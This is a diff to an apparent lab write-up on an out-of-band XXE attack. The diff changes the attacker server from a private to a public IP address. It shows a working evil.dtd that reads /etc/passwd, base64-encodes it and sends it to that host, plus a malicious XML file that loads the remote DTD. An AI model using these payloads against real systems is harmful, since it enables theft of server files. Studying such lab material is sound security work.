@@ -47,7 +47,7 @@ Now that we have confirmed the vulnerability and observed that it reaches out to
 we will proceed with an external DTD (Document Type Definition) attack.  using this ==`evil.dtd`== file :-
 ```
 <!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.240:8888/?x=%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://203.192.225.70:8888/evil.dtd/?x=%data;'>">
 
 ```
 
@@ -82,7 +82,7 @@ Now, let's modify our `contacts.xml` file  as .==`Evil_contacts(Lab2).xml`==
 <?xml version="1.0" encoding="UTF-8"?>
 
 <!DOCTYPE contacts [
-  <!ENTITY % remote SYSTEM "http://192.168.0.240:8888/evil.dtd">
+  <!ENTITY % remote SYSTEM "http://203.192.225.70:8888/evil.dtd">
   %remote;%param1;
 ]>
 <contacts>
@@ -101,7 +101,7 @@ Now, let's modify our `contacts.xml` file  as .==`Evil_contacts(Lab2).xml`==
 </contacts>
 
 ```
-First, we replace the Burp Collaborator link with our private server's URL, which references the external DTD file. (http://192.168.0.240:8888/evil.dtd)
+First, we replace the Burp Collaborator link with our private server's URL, which references the external DTD file. (http://203.192.225.70:8888/evil.dtd)
 
 Next, we define XML entities that reference the external DTD.
 
